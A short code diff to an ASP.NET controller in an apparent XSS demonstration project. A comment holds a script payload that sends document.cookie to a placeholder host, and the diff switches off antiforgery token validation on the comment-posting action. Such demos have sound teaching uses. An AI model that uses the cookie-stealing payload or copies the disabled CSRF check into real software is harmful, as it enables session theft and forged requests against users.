@@ -21,6 +21,7 @@ namespace XSS.Web.Controllers
             _urlEncoder = urlEncoder;
         }
 
+        
         public IActionResult CommentAdd()
         {
             // <script>new Image().src="http://www.example.com/cookiereader?accountinformation="+ document.cookie</script>
@@ -35,7 +36,8 @@ namespace XSS.Web.Controllers
 
             return View();
         }
-
+        [IgnoreAntiforgeryToken]
+        //[ValidateAntiForgeryToken]
         [HttpPost]
         public IActionResult CommentAdd(string name, string comment)
         {
